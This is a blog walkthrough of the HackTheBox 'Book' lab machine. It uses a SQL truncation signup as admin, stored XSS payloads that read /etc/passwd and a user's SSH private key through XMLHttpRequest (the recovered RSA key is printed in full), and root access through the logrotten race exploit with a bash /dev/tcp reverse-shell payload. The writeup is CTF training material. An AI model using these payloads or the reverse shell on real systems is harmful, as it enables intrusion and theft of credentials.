---
date: 2020-07-11 23:48:05
layout: post
title: HackTheBox Book Writeup
subtitle: Hackthebox Book Writeup.
description: >-
  in this blog i've explained how to solve Book machine in hackthebox
image: https://i.ibb.co/7gtqsCZ/book.png
optimized_image: https://i.ibb.co/7gtqsCZ/book.png
category: hackthebox
tags:
  - hackthebox
  - Book
author: Ahmed Fatouh
paginate: true
---

![logo](https://i.ibb.co/7gtqsCZ/book.png)

# []() Methodology

* Nmap scan
* Directory Enumeration
* SQL Truncation Lead To Sign up as Admin
* XSS lead to Local File Read.
* Read the SSH Private-Key with XSS
* Privilege Escalation

# []()Nmap-Scan:

> as always, i did nmap scan to find out which servicecs was running in this machine, i found 2 opened ports.

> 22 for ssh and 80 for apache server.

> nmap -sV -sC -oN scan.txt 10.10.10.176

```ruby

Nmap scan report for 10.10.10.176
Host is up (0.38s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# []() Checking The WebPage:

* the webpage was very simple, in the webpage we can signup with normal user, but we need to signup with admin account so we will signup as admin with SQL Truncation Attack.

* after signing up as admin, we can read the pdf's of the users so as a normal user i will inject my xss payload to read local files in the server and from the admin panel i will see the ouptut.

* let's go.

> ![webpage](https://i.ibb.co/KNkgkTd/we.png)

* the webpage very simple, now let's sign up as a normal user and check what we have.

> ![home](https://i.ibb.co/44fVS89/home.png)

> very simple! but the important thing in this page is the collection section, we will use it to achieve our attack.

> now we need to sign up as admin, i will use sql truncation attack to sign up as admin and you can learn about it from [here](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

* if you try to sign up with "admin@book.htb" you will fail without the SQL Attack.

> ![](https://i.ibb.co/k5wLj6D/admin.png)

> i will learn you how to achieve the sql attack now.
>
> ![](https://i.ibb.co/Sd6YVKX/sql-attack.gif)

* nice! let's start now.

# []() SQL Truncation & XSS 

* first thing let's fire up girbuster to search for any important directory.

> ![](https://i.ibb.co/Zc9yqBR/gobuster.png)

* nice! we found the admin login page.

> ![](https://i.ibb.co/d5CqVyy/loginadmin.png)

* now i will sign up as admin using the SQL Truncation attack and login in the normal page and the admin panel too.

> ![](https://i.ibb.co/k1W3Q8k/adminpanel.png)

* we logged in now as admin

> go to the normal page and go to collections and upload any file with the xss payload in the title. [XSS-Attack](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)

> this is the normal user page, i will upload txt file with xss payload in the title.


```ruby

 <script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();
</script>

```

> ![](https://i.ibb.co/Mf6fZGL/normal-user.png)

> go to admin panel and download the collections pdf and pingo!.
>
> ![](https://i.ibb.co/XWC7sMv/etc.png)

* nice!

* let's read the **/home/reader/.ssh/id_rsa** to login with ssh as **reader**.

```ruby

 <script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///home/reader/.ssh/id_rsa");
x.send();
</script>

```

> ![](https://i.ibb.co/9cZW2y2/ssh-reader.png)

* nice!

* to see all of the id_sra txt just convert the pdf to txt and you will be able to read it. use this tool [pdf-miner](https://github.com/pdfminer/pdfminer.six.git)

```ruby

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=
-----END RSA PRIVATE KEY-----

```

* let's login with this key now.

> **User-Flag**
>
> ![](https://i.ibb.co/xgShwqh/user.gif)


# []() Privilege Escalation --> Root

> after some enumeration i found that there is service running with root privilege so i used it to got root access. let's go.

> i will use pspy64 to check the processes, and here it is.
>
> ![](https://i.ibb.co/fN9GJfy/logrotate.png)

* nice! what is logrotate ?!

> logrotate is designed to ease administration of systems that generate large numbers of log files. It allows automatic rotation, compression, removal, and mailing of log files. Each log file may be handled daily, weekly, monthly, or when it grows too large. [Logrotate](https://linux.die.net/man/8/logrotate)

> i will use this exploit [Logrotate-Exploit](https://github.com/whotwagner/logrotten)

* logrotate is prone to a race condition after renaming the logfile.

* If logrotate is executed as root, with option that creates a file ( like create, copy, compress, etc.) and the user is in control of the logfile path, it is possible to abuse a race-condition to write files in ANY directories.

* An attacker could elevate his privileges by writing reverse-shells into directories like "/home/reader/backups/access.log".

> we will use this exploit to abuse the access.log file in the **/home/reader/backups/** to give us reverse shell as root, then we will cat the ssh-key for root.

* let's go

> clone the exploit in your machine with **git clone https://github.com/whotwagner/logrotten.git**

> compile it with **gcc logrotten.c -o logrotexp**, and upload the exploit to book machine.

> the exploit need a payload so let's meke it. >> **bash -i >& /dev/tcp/10.x.x.x/8080 0>&1**

* we need to be fast, let's go.

> SSH-Private key --> root
>
> ![root](https://i.ibb.co/pWRHfFt/root.gif)

* nice!, we got the SSH-key for root.

> Root-Flag
>
> ![pwned](https://i.ibb.co/YthDBts/pwned.gif)

* Thanks for reading.


